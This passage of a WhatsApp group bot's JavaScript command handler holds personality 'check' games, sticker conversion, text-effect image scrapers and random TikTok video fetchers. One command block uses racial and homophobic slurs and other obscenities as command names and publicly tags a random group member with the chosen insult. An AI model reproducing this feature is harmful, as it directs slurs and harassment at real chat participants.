					var bukcin = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var arp = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var cakep = ['Ya','Tidak','Sangat Jelek','Sangat Tampan','Pake Nanya 😂']
					var wetak= ['Peduli', 'dermawan', 'Orang pemarah', 'Maaf', 'Penurut', 'Baik', 'Maaf', 'Baik Hati', 'Sabar', 'UwU', 'Top', 'Membantu', 'Cerdik', 'Bijaksana', 'Kreatif', 'Penuh semangat', 'Jujur', 'Perhatian', 'Pantang menyerah', 'Optimis']
					var baikk = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var bhuruk = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var cerdhas = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var berhani = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var mengheikan = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var sipat = sifat[Math.floor(Math.random() * sifat.length)]
					var biho = hoby[Math.floor(Math.random() * hoby.length)]
					var bhucin = bukcin[Math.floor(Math.random() * bukcin.length)]
					var senga = arp[Math.floor(Math.random() * arp.length)]
					var chakep = cakep[Math.floor(Math.random() * cakep.length)]
					var watak = wetak[Math.floor(Math.random() * wetak.length)]
					var baik = baikk[Math.floor(Math.random() * baikk.length)]
					var burug = bhuruk[Math.floor(Math.random() * bhuruk.length)]
					var cerdas = cerdhas[Math.floor(Math.random() * cerdhas.length)]
					var berani = berhani[Math.floor(Math.random() * berhani.length)]
					var takut = mengheikan[Math.floor(Math.random() * mengheikan.length)]
					 profile = `*MENGECEK @${bet.split('@')[0]}*

*Nama:* ${pushname}
*Sifat:* ${sipat}
*Hobi:* ${biho}
*Bucin:* ${bhucin}%
*Sange:* ${senga}%
*Cakep:* ${chakep}
*Watak:* ${watak}
*Baik:* ${baik}%
*Jahat:* ${burug}%
*Cerdas:* ${cerdas}%
*Berani:* ${berani}%
*Takut:* ${takut}%

`
					buff = await getBuffer(ppuser)
XeonBotInc.sendMessage(from, { image: buff, caption: profile, mentions: [bet]},{quoted:m})
break
case 'jdjjdjdj': {
if (!/webp/.test(mime)) return replygcxeon(`Balas Stiker Dengan Perintah *${prefix+command}*`)
let media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return replygcxeon(err)
let buffer = fs.readFileSync(ran)
XeonBotInc.sendMessage(m.chat, { image: buffer, jpegThumbnail: defaultpp }, { quoted: m })
fs.unlinkSync(ran)
})
}
break
case 'hgcgg': case 'hvvg': case 'ugcc': case 'jgcft':{
if (!isPrem) return replyprem(mess.premium)
if (!args.join(" ")) return replygcxeon(`Format: *.stickerwm Nama Paket|Pengarang*`)
const swn = args.join(" ")
const pcknm = swn.split("|")[0];
const atnm = swn.split("|")[1];
if (m.quoted.isAnimated === true) {
XeonBotInc.downloadAndSaveMediaMessage(quoted, "gifee")
XeonBotInc.sendMessage(from, {sticker:fs.readFileSync("gifee.webp")},{quoted:m})
} else if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await XeonBotInc.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return replygcxeon('*Maksimal 10 Detik*')
let media = await quoted.download()
let encmedia = await XeonBotInc.sendVideoAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
await fs.unlinkSync(encmedia)
} else {
replygcxeon(`Photo/Video?`)
}
}
break
case 'ihvvvv': 
case 'vvghjbh': 
case 'hvcfgh': {
if (!quoted) return replygcxeon(`Balas Atau Kirim Gambar/Vidio/Gif Dengan Perintah *${prefix+command}*\n\n*Maksimal Vidio 10 Detik*`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await XeonBotInc.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return replygcxeon('Balas Atau Kirim Gambar/Vidio/Gif Dengan Perintah *${prefix+command}*\n\n*Maksimal Vidio 10 Detik*')
let media = await quoted.download()
let encmedia = await XeonBotInc.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
replygcxeon(`Balas Atau Kirim Gambar/Vidio/Gif Dengan Perintah *${prefix+command}*\n\n*Maksimal Vidio 10 Detik*`)
}
}
break
case 'stupid':
      case 'foolish':
      case 'smart':
      case 'idiot':
      case 'gay':
      case 'lesbi':
      case 'bastard':
      case 'stubble':
      case 'dog':
      case 'fuck':
      case 'ape':
      case 'noob':
      case 'great':
      case 'horny':
      case 'wibu':
      case 'asshole':
      case 'handsome':
      case 'beautiful':
      case 'cute':
      case 'kind':
      case 'ugly':
      case 'pretty':
      case 'lesbian':
      case 'randi':
      case 'gandu':
      case 'madarchod':
      case 'kala':
      case 'gora':
      case 'chutiya':
      case 'nibba':
      case 'nibbi':
      case 'bhosdiwala':
      case 'chutmarika':
      case 'bokachoda':
      case 'suarerbaccha':
      case 'bolochoda':
      case 'muthal':
      case 'muthbaaz':
      case 'randibaaz':
      case 'topibaaz':
      case 'cunt':
      case 'nerd':
      case 'behenchod':
      case 'behnchoda':
      case 'bhosdika':
      case 'nerd':
      case 'mc':
      case 'bsdk':
      case 'bhosdk':
      case 'nigger':
      case 'loda':
      case 'laund':
      case 'nigga':
      case 'noobra':
      case 'tharki':
      case 'nibba':
      case 'nibbi':
      case 'mumu':
      case 'rascal':
      case 'scumbag':
      case 'nuts':
      case 'comrade':
      case 'fagot':
      case 'scoundrel':
      case 'ditch':
      case 'dope':
      case 'gucci':
      case 'lit':
      case 'dumbass':
      case 'sexy':
      case 'crackhead':
      case 'mf':
      case 'motherfucker':
      case 'dogla':
      case 'bewda':
      case 'boka':
      case 'khanki':
      case 'bal':
      case 'sucker':
      case 'fuckboy':
      case 'playboy':
      case 'fuckgirl':
      case 'playgirl':
      case 'hot': {
if (!m.isGroup) return replygcxeon(mess.group)
let member = participants.map((u) => u.id)
let org = member[Math.floor(Math.random() * member.length)]
XeonBotInc.sendMessage(m.chat,
{ text: `Paling *${command}* Disini Adalah *@${org.split('@')[0]}*`,
contextInfo:{
mentionedJid:[org],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./XeonMedia/theme/cheemspic.jpg`),
"sourceUrl": `${wagc}`}}},
{ quoted: m})
}
break
case 'handsomecheck':
				if (!text) return replygcxeon(`Format: *${prefix + command} Tag*`)
					const gan = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const teng = gan[Math.floor(Math.random() * gan.length)]
XeonBotInc.sendMessage(from, { text: `*${command}*\n\nNama: *${q}*\nHasil: *${teng}%*` }, { quoted: m })
					break
case 'beautifulcheck':
				if (!text) return replygcxeon(`Format: *${prefix + command} Tag*`)
					const can = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const tik = can[Math.floor(Math.random() * can.length)]
XeonBotInc.sendMessage(from, { text: `*${command}*\n\nNama: *${q}*\nHasil: *${tik}%*` }, { quoted: m })
					break
					case 'charactercheck':
					if (!text) return replygcxeon(`Format: *${prefix + command} Tag*`)
					const xeony =['Peduli', 'dermawan', 'Orang pemarah', 'Maaf', 'Penurut', 'Baik', 'Maaf', 'Baik Hati', 'Sabar', 'UwU', 'Top', 'Membantu', 'Cerdik', 'Bijaksana', 'Kreatif', 'Penuh semangat', 'Jujur', 'Perhatian', 'Pantang menyerah', 'Optimis']
					const taky = xeony[Math.floor(Math.random() * xeony.length)]
					XeonBotInc.sendMessage(from, { text: `Cek Karakter: *${q}*\nHasil: *${taky}*` }, { quoted: m })
				     break
case 'awesomecheck':
  case 'greatcheck':
    case 'gaycheck':
      case 'cutecheck':
        case 'lesbicheck':
          case 'lesbiancheck':
             case 'hornycheck':
                 case 'prettycheck':
                    case 'lovelycheck':
                      case 'uglycheck':
if (!m.isGroup) return replygcxeon(mess.group)
const cex = body.slice(0)
const cek1 = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const cek2 = cek1[Math.floor(Math.random() * cek1.length)]
if (mentionByReply) {
XeonBotInc.sendMessage(from, { text: 'Question : *' + cex + '*\nChecker : ' + `@${mentionByReply.split('@')[0]}` + '\nAnswer : ' + cek2 + '%', mentions: [mentionByReply] }, { quoted: m })
} else if (mentionByTag[0] && isGroup) {
XeonBotInc.sendMessage(from, { text: 'Question : *' + cex + '*\nChecker : ' + `@${mentionByTag[0].split('@')[0]}` + '\nAnswer : ' + cek2 + '%', mentions: [mentionByTag[0]] }, { quoted: m })
} else if (!mentionByReply && !mentionByTag[0]) {
XeonBotInc.sendMessage(from, { text: 'Question : *' + cex + '*\nChecker : ' + `@${sender.split('@')[0]}` + '\nAnswer : ' + cek2 + '%', mentions: [sender] }, { quoted: m })
}
break
case 'style': case 'styletext': {
		let { styletext } = require('./lib/scraper')
		if (!text) return replygcxeon('Format: *.style Teks*')
		replygcxeon(mess.wait)
                let anu = await styletext(text)
                let teks = `Gaya Teks Dari *${text}*\n\n`
                for (let i of anu) {
                    teks += `${themeemoji} *${i.name}* : ${i.result}\n\n`
                }
                replygcxeon(teks)
	    }
	    break
case 'candy': 
case 'christmas': 
case '3dchristmas': 
case 'sparklechristmas':
case 'deepsea': 
case 'scifi': 
case 'rainbow': 
case 'waterpipe': 
case 'spooky': 
case 'pencil': 
case 'circuit': 
case 'discovery': 
case 'metalic': 
case 'fiction': 
case 'demon': 
case 'transformer': 
case 'berry': 
case 'thunder': 
case 'magma': 
case '3dstone': 
case 'neonlight': 
case 'glitch': 
case 'harrypotter': 
case 'brokenglass': 
case 'papercut': 
case 'watercolor': 
case 'multicolor': 
case 'neondevil': 
case 'underwater': 
case 'graffitibike':
case 'snow': 
case 'cloud': 
case 'honey': 
case 'ice': 
case 'fruitjuice': 
case 'biscuit': 
case 'wood': 
case 'chocolate': 
case 'strawberry': 
case 'matrix': 
case 'blood': 
case 'dropwater': 
case 'toxic': 
case 'lava': 
case 'rock': 
case 'bloodglas': 
case 'hallowen': 
case 'darkgold': 
case 'joker': 
case 'wicker':
case 'firework': 
case 'skeleton': 
case 'blackpink': 
case 'sand': 
case 'glue': 
case '1917': 
case 'leaves': {
if (!q) return replygcxeon(`Format: *${prefix+command} Teks*`) 
replygcxeon(mess.wait)
let link
if (/candy/.test(command)) link = 'https://textpro.me/create-christmas-candy-cane-text-effect-1056.html'
if (/christmas/.test(command)) link = 'https://textpro.me/christmas-tree-text-effect-online-free-1057.html'
if (/3dchristmas/.test(command)) link = 'https://textpro.me/3d-christmas-text-effect-by-name-1055.html'
if (/sparklechristmas/.test(command)) link = 'https://textpro.me/sparkles-merry-christmas-text-effect-1054.html'
if (/deepsea/.test(command)) link = 'https://textpro.me/create-3d-deep-sea-metal-text-effect-online-1053.html'
if (/scifi/.test(command)) link = 'https://textpro.me/create-3d-sci-fi-text-effect-online-1050.html'
if (/rainbow/.test(command)) link = 'https://textpro.me/3d-rainbow-color-calligraphy-text-effect-1049.html'
if (/waterpipe/.test(command)) link = 'https://textpro.me/create-3d-water-pipe-text-effects-online-1048.html'
if (/spooky/.test(command)) link = 'https://textpro.me/create-halloween-skeleton-text-effect-online-1047.html'
if (/pencil/.test(command)) link = 'https://textpro.me/create-a-sketch-text-effect-online-1044.html'
if (/circuit/.test(command)) link = 'https://textpro.me/create-blue-circuit-style-text-effect-online-1043.html'
if (/discovery/.test(command)) link = 'https://textpro.me/create-space-text-effects-online-free-1042.html'
if (/metalic/.test(command)) link = 'https://textpro.me/creat-glossy-metalic-text-effect-free-online-1040.html'
if (/fiction/.test(command)) link = 'https://textpro.me/create-science-fiction-text-effect-online-free-1038.html'
if (/demon/.test(command)) link = 'https://textpro.me/create-green-horror-style-text-effect-online-1036.html'
if (/transformer/.test(command)) link = 'https://textpro.me/create-a-transformer-text-effect-online-1035.html'
if (/berry/.test(command)) link = 'https://textpro.me/create-berry-text-effect-online-free-1033.html'
if (/thunder/.test(command)) link = 'https://textpro.me/online-thunder-text-effect-generator-1031.html'
if (/magma/.test(command)) link = 'https://textpro.me/create-a-magma-hot-text-effect-online-1030.html'
if (/3dstone/.test(command)) link = 'https://textpro.me/3d-stone-cracked-cool-text-effect-1029.html'
if (/neonlight/.test(command)) link = 'https://textpro.me/create-3d-neon-light-text-effect-online-1028.html'
if (/glitch/.test(command)) link = 'https://textpro.me/create-impressive-glitch-text-effects-online-1027.html'
if (/harrypotter/.test(command)) link = 'https://textpro.me/create-harry-potter-text-effect-online-1025.html'
if (/brokenglass/.test(command)) link = 'https://textpro.me/broken-glass-text-effect-free-online-1023.html'
if (/papercut/.test(command)) link = 'https://textpro.me/create-art-paper-cut-text-effect-online-1022.html'
if (/watercolor/.test(command)) link = 'https://textpro.me/create-a-free-online-watercolor-text-effect-1017.html'
if (/multicolor/.test(command)) link = 'https://textpro.me/online-multicolor-3d-paper-cut-text-effect-1016.html'
if (/neondevil/.test(command)) link = 'https://textpro.me/create-neon-devil-wings-text-effect-online-free-1014.html'
if (/underwater/.test(command)) link = 'https://textpro.me/3d-underwater-text-effect-generator-online-1013.html'
if (/graffitibike/.test(command)) link = 'https://textpro.me/create-wonderful-graffiti-art-text-effect-1011.html'
if (/snow/.test(command)) link = 'https://textpro.me/create-snow-text-effects-for-winter-holidays-1005.html'
if (/cloud/.test(command)) link = 'https://textpro.me/create-a-cloud-text-effect-on-the-sky-online-1004.html'
if (/honey/.test(command)) link = 'https://textpro.me/honey-text-effect-868.html'
if (/ice/.test(command)) link = 'https://textpro.me/ice-cold-text-effect-862.html'
if (/fruitjuice/.test(command)) link = 'https://textpro.me/fruit-juice-text-effect-861.html'
if (/biscuit/.test(command)) link = 'https://textpro.me/biscuit-text-effect-858.html'
if (/wood/.test(command)) link = 'https://textpro.me/wood-text-effect-856.html'
if (/chocolate/.test(command)) link = 'https://textpro.me/chocolate-cake-text-effect-890.html'
if (/strawberry/.test(command)) link = 'https://textpro.me/strawberry-text-effect-online-889.html'
if (/matrix/.test(command)) link = 'https://textpro.me/matrix-style-text-effect-online-884.html'
if (/blood/.test(command)) link = 'https://textpro.me/horror-blood-text-effect-online-883.html'
if (/dropwater/.test(command)) link = 'https://textpro.me/dropwater-text-effect-872.html'
if (/toxic/.test(command)) link = 'https://textpro.me/toxic-text-effect-online-901.html'
if (/lava/.test(command)) link = 'https://textpro.me/lava-text-effect-online-914.html'
if (/rock/.test(command)) link = 'https://textpro.me/rock-text-effect-online-915.html'
if (/bloodglas/.test(command)) link = 'https://textpro.me/blood-text-on-the-frosted-glass-941.html'
if (/hallowen/.test(command)) link = 'https://textpro.me/halloween-fire-text-effect-940.html'
if (/darkgold/.test(command)) link = 'https://textpro.me/metal-dark-gold-text-effect-online-939.html'
if (/joker/.test(command)) link = 'https://textpro.me/create-logo-joker-online-934.html'
if (/wicker/.test(command)) link = 'https://textpro.me/wicker-text-effect-online-932.html'
if (/firework/.test(command)) link = 'https://textpro.me/firework-sparkle-text-effect-930.html'
if (/skeleton/.test(command)) link = 'https://textpro.me/skeleton-text-effect-online-929.html'
if (/blackpink/.test(command)) link = 'https://textpro.me/create-blackpink-logo-style-online-1001.html'
if (/sand/.test(command)) link = 'https://textpro.me/write-in-sand-summer-beach-free-online-991.html'
if (/glue/.test(command)) link = 'https://textpro.me/create-3d-glue-text-effect-with-realistic-style-986.html'
if (/1917/.test(command)) link = 'https://textpro.me/1917-style-text-effect-online-980.html'
if (/leaves/.test(command)) link = 'https://textpro.me/natural-leaves-text-effect-931.html'
let anu = await textpro.textpro(link, q)
XeonBotInc.sendMessage(m.chat, { image: { url: anu }, caption: `*Sukses*` }, { quoted: m })
}
break
case 'glitchtext':
case 'writetext':
case 'advancedglow':
case 'typographytext':
case 'pixelglitch':
case 'neonglitch':
case 'flagtext':
case 'flag3dtext':
case 'deletingtext':
case 'blackpinkstyle':
case 'glowingtext':
case 'underwatertext':
case 'logomaker':
case 'cartoonstyle':
case 'papercutstyle':
case 'watercolortext':
case 'effectclouds':
case 'blackpinklogo':
case 'gradienttext':
case 'summerbeach':
case 'luxurygold':
case 'multicoloredneon':
case 'sandsummer':
case 'galaxywallpaper':
case '1917style':
case 'makingneon':
case 'royaltext':
case 'freecreate':
case 'galaxystyle':
case 'lighteffects':{
if (!q) return replygcxeon(`Format: *${prefix+command} Teks*`) 
replygcxeon(mess.wait)
let link
if (/glitchtext/.test(command)) link = 'https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html'
if (/writetext/.test(command)) link = 'https://en.ephoto360.com/write-text-on-wet-glass-online-589.html'
if (/advancedglow/.test(command)) link = 'https://en.ephoto360.com/advanced-glow-effects-74.html'
if (/typographytext/.test(command)) link = 'https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html'
if (/pixelglitch/.test(command)) link = 'https://en.ephoto360.com/create-pixel-glitch-text-effect-online-769.html'
if (/neonglitch/.test(command)) link = 'https://en.ephoto360.com/create-impressive-neon-glitch-text-effects-online-768.html'
if (/flagtext/.test(command)) link = 'https://en.ephoto360.com/nigeria-3d-flag-text-effect-online-free-753.html'
if (/flag3dtext/.test(command)) link = 'https://en.ephoto360.com/free-online-american-flag-3d-text-effect-generator-725.html'
if (/deletingtext/.test(command)) link = 'https://en.ephoto360.com/create-eraser-deleting-text-effect-online-717.html'
if (/blackpinkstyle/.test(command)) link = 'https://en.ephoto360.com/online-blackpink-style-logo-maker-effect-711.html'
if (/glowingtext/.test(command)) link = 'https://en.ephoto360.com/create-glowing-text-effects-online-706.html'
if (/underwatertext/.test(command)) link = 'https://en.ephoto360.com/3d-underwater-text-effect-online-682.html'
if (/logomaker/.test(command)) link = 'https://en.ephoto360.com/free-bear-logo-maker-online-673.html'
if (/cartoonstyle/.test(command)) link = 'https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html'
if (/papercutstyle/.test(command)) link = 'https://en.ephoto360.com/multicolor-3d-paper-cut-style-text-effect-658.html'
if (/watercolortext/.test(command)) link = 'https://en.ephoto360.com/create-a-watercolor-text-effect-online-655.html'
if (/effectclouds/.test(command)) link = 'https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html'
if (/blackpinklogo/.test(command)) link = 'https://en.ephoto360.com/create-blackpink-logo-online-free-607.html'
if (/gradienttext/.test(command)) link = 'https://en.ephoto360.com/create-3d-gradient-text-effect-online-600.html'
if (/summerbeach/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html'
if (/luxurygold/.test(command)) link = 'https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html'
if (/multicoloredneon/.test(command)) link = 'https://en.ephoto360.com/create-multicolored-neon-light-signatures-591.html'
if (/sandsummer/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html'
if (/galaxywallpaper/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-wallpaper-mobile-online-528.html'
if (/1917style/.test(command)) link = 'https://en.ephoto360.com/1917-style-text-effect-523.html'
if (/makingneon/.test(command)) link = 'https://en.ephoto360.com/making-neon-light-text-effect-with-galaxy-style-521.html'
if (/royaltext/.test(command)) link = 'https://en.ephoto360.com/royal-text-effect-online-free-471.html'
if (/freecreate/.test(command)) link = 'https://en.ephoto360.com/free-create-a-3d-hologram-text-effect-441.html'
if (/galaxystyle/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html'
if (/lighteffects/.test(command)) link = 'https://en.ephoto360.com/create-light-effects-green-neon-online-429.html'
let haldwhd = await ephoto(link, q)
XeonBotInc.sendMessage(m.chat, { image: { url: haldwhd }, caption: `*Sukses*` }, { quoted: m })
}
break
case 'shadow': 
case 'write': 
case 'romantic': 
case 'burnpaper':
case 'smoke': 
case 'narutobanner': 
case 'love': 
case 'undergrass':
case 'doublelove': 
case 'coffecup':
case 'underwaterocean':
case 'smokyneon':
case 'starstext':
case 'rainboweffect':
case 'balloontext':
case 'metalliceffect':
case 'embroiderytext':
case 'flamingtext':
case 'stonetext':
case 'writeart':
case 'summertext':
case 'wolfmetaltext':
case 'nature3dtext':
case 'rosestext':
case 'naturetypography':
case 'quotesunder':
case 'shinetext':{
if (!q) return replygcxeon(`Format: *${prefix+command} Teks*`) 
replygcxeon(mess.wait)
let link
if (/stonetext/.test(command)) link = 'https://photooxy.com/online-3d-white-stone-text-effect-utility-411.html'
if (/writeart/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-art-quote-on-wood-heart-370.html'
if (/summertext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/3d-summer-text-effect-367.html'
if (/wolfmetaltext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-a-wolf-metal-text-effect-365.html'
if (/nature3dtext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/make-nature-3d-text-effects-364.html'
if (/rosestext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/yellow-roses-text-360.html'
if (/naturetypography/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-vector-nature-typography-355.html'
if (/quotesunder/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/quotes-under-fall-leaves-347.html'
if (/shinetext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/rainbow-shine-text-223.html'
if (/shadow/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/shadow-text-effect-in-the-sky-394.html'
if (/write/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-text-on-the-cup-392.html'
if (/romantic/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/romantic-messages-for-your-loved-one-391.html'
if (/burnpaper/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-text-on-burn-paper-388.html'
if (/smoke/.test(command)) link = 'https://photooxy.com/other-design/create-an-easy-smoke-type-effect-390.html'
if (/narutobanner/.test(command)) link = 'https://photooxy.com/manga-and-anime/make-naruto-banner-online-free-378.html'
if (/love/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-a-picture-of-love-message-377.html'
if (/undergrass/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/make-quotes-under-grass-376.html'
if (/doublelove/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/love-text-effect-372.html'
if (/coffecup/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/put-any-text-in-to-coffee-cup-371.html'
if (/underwaterocean/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/creating-an-underwater-ocean-363.html'
if (/smokyneon/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/make-smoky-neon-glow-effect-343.html'
if (/starstext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-stars-text-on-the-night-sky-200.html'
if (/rainboweffect/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/glow-rainbow-effect-generator-201.html'
if (/balloontext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/royal-look-text-balloon-effect-173.html'
if (/metalliceffect/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/illuminated-metallic-effect-177.html'
if (/embroiderytext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-embroidery-text-online-191.html'
if (/flamingtext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/realistic-flaming-text-effect-online-197.html'
let dehe = await photooxy.photoOxy(link, q)
XeonBotInc.sendMessage(m.chat, { image: { url: dehe }, caption: `*Sukses*` }, { quoted: m })
}
break
case 'tiktokgirl':
replygcxeon(mess.wait)
var asupan = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/tiktokgirl.json'))
var hasil = pickRandom(asupan)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokghea':
replygcxeon(mess.wait)
var gheayubi = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/gheayubi.json'))
var hasil = pickRandom(gheayubi)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokbocil':
replygcxeon(mess.wait)
var bocil = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/bocil.json'))
var hasil = pickRandom(bocil)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktoknukhty':
replygcxeon(mess.wait)
var ukhty = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/ukhty.json'))
var hasil = pickRandom(ukhty)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktoksantuy':
replygcxeon(mess.wait)
var santuy = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/santuy.json'))
var hasil = pickRandom(santuy)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokkayes':
replygcxeon(mess.wait)
var kayes = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/kayes.json'))
var hasil = pickRandom(kayes)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokpanrika':
replygcxeon(mess.wait)
var rikagusriani = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/panrika.json'))
var hasil = pickRandom(rikagusriani)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktoknotnot':
replygcxeon(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/notnot.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'chinese':
replygcxeon(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/china.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'hijab':
replygcxeon(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/hijab.json'))
var hasil = pickRandom(notnot)
